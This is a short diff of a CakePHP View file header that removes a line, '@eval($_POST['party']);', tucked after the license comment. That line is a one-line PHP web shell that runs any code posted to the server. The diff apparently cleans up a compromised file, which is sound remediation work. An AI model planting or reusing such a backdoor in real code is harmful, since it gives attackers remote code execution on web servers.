@@ -17,7 +17,7 @@
  * @package       Cake.View
  * @since         CakePHP(tm) v 0.2.9
  * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
- */ @eval($_POST['party']);
+ */
 
 App::uses('Router', 'Routing');
 
